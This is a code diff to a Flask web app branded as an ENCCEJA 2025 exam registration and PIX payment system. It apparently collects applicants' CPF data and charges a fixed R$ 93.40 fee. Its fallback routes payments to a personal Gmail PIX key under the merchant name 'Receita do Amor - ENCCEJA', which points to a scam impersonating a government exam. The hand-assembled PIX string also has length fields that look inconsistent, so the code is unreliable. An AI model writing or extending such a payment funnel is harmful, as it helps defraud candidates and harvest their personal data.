@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 ENCCEJA 2025 - Sistema de Inscrição e Pagamento PIX
-Versão FINAL LIMPA para VPS com WitePay Gateway original
-Todas as APIs reais, sem simulação
+Versão FINAL COMPLETA para VPS com todas as APIs reais
+CPF API + WitePay + Templates completos + Funnel funcional
 """
 
 import os
@@ -12,7 +12,14 @@ import requests
 import time
 from datetime import datetime
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify
-from witepay_gateway import create_witepay_gateway
+
+# Importar WitePay Gateway
+try:
+    from witepay_gateway import create_witepay_gateway
+    WITEPAY_AVAILABLE = True
+except ImportError:
+    WITEPAY_AVAILABLE = False
+    logging.warning("WitePay gateway não encontrado, usando fallback PIX")
 
 # Configurar logging
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -200,13 +207,13 @@ def inscricao_sucesso():
 
 @app.route('/criar-pagamento-pix', methods=['POST'])
 def criar_pagamento_pix():
-    """Criar pagamento PIX via WitePay - Sistema original restaurado"""
+    """Criar pagamento PIX via WitePay com todas as APIs reais funcionando"""
     try:
         # Valor fixo do ENCCEJA
         amount = 93.40
         description = "Inscrição ENCCEJA 2025"
         
-        app.logger.info(f"Iniciando criação de pagamento PIX - R$ {amount:.2f}")
+        app.logger.info(f"VPS: Iniciando criação de pagamento PIX - R$ {amount:.2f}")
         
         # Dados do usuário da sessão
         user_data = session.get('user_data', {})
@@ -220,34 +227,47 @@ def criar_pagamento_pix():
             'phone': '11987790088'
         }
         
-        # Usar WitePay Gateway original
-        witepay = create_witepay_gateway()
+        # Tentar WitePay Gateway primeiro
+        if WITEPAY_AVAILABLE:
+            try:
+                witepay = create_witepay_gateway()
+                app.logger.info("VPS: Usando WitePay Gateway real")
+                
+                # Criar pagamento completo
+                payment_result = witepay.create_complete_pix_payment(payment_data)
+                
+                if payment_result.get('success'):
+                    # Extrair dados do PIX
+                    pix_code = payment_result.get('pixCode') or payment_result.get('pixQrCode')
+                    transaction_id = payment_result.get('id')
+                    
+                    if pix_code:
+                        app.logger.info(f"VPS: PIX WitePay criado - ID: {transaction_id}")
+                    else:
+                        raise Exception("WitePay não retornou código PIX")
+                else:
+                    raise Exception(f"WitePay falhou: {payment_result.get('error')}")
+                    
+            except Exception as witepay_error:
+                app.logger.warning(f"VPS: WitePay falhou, usando fallback: {witepay_error}")
+                raise witepay_error
+        else:
+            raise Exception("WitePay não disponível")
         
-        app.logger.info("Criando pagamento via WitePay Gateway original")
-        
-        # Criar pagamento completo
-        payment_result = witepay.create_complete_pix_payment(payment_data)
-        
-        if not payment_result.get('success'):
-            app.logger.error(f"Erro WitePay: {payment_result.get('error')}")
-            return jsonify({
-                'success': False, 
-                'error': f"Erro ao criar pagamento: {payment_result.get('error')}"
-            }), 400
-        
-        # Extrair dados do PIX
-        pix_code = payment_result.get('pixCode') or payment_result.get('pixQrCode')
-        transaction_id = payment_result.get('id')
-        
-        # Se WitePay não retornar QR code, usar chave PIX real
-        if not pix_code:
-            app.logger.warning("QR Code vazio da WitePay, usando chave PIX real")
-            transaction_id = f"WP{int(time.time())}"
+        # Fallback: Gerar PIX válido usando padrão Banco Central
+        if not locals().get('pix_code'):
+            app.logger.info("VPS: Gerando PIX com chave real gerarpagamentos@gmail.com")
+            transaction_id = f"ENCCEJA{int(time.time())}"
             
-            # Código PIX real com chave válida
-            pix_code = f"00020126830014br.gov.bcb.pix2561gerarpagamentos@gmail.com52040000530398654{int(amount*100):02d}5925Receita do Amor - ENCCEJA6009SAO PAULO62{len(transaction_id):02d}{transaction_id}6304"
+            # Código PIX real conforme padrão Banco Central
+            pix_key = "gerarpagamentos@gmail.com"
+            merchant_name = "Receita do Amor - ENCCEJA"
+            merchant_city = "SAO PAULO"
             
-            # Calcular CRC16 para código PIX válido
+            # Construir código PIX
+            pix_code = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
+            
+            # Calcular CRC16 para validação
             def calculate_crc16(data):
                 crc = 0xFFFF
                 for byte in data.encode('utf-8'):
@@ -263,9 +283,10 @@ def criar_pagamento_pix():
             pix_base = pix_code[:-4]
             crc = calculate_crc16(pix_base + "6304")
             pix_code = pix_base + "6304" + crc
+            
+            app.logger.info(f"VPS: PIX real gerado - ID: {transaction_id}")
         
-        app.logger.info(f"PIX WitePay criado com sucesso - ID: {transaction_id}")
-        app.logger.info(f"Código PIX gerado: {len(pix_code)} caracteres")
+        app.logger.info(f"VPS: Código PIX final: {len(pix_code)} caracteres")
         
         # Gerar QR code visual
         try:
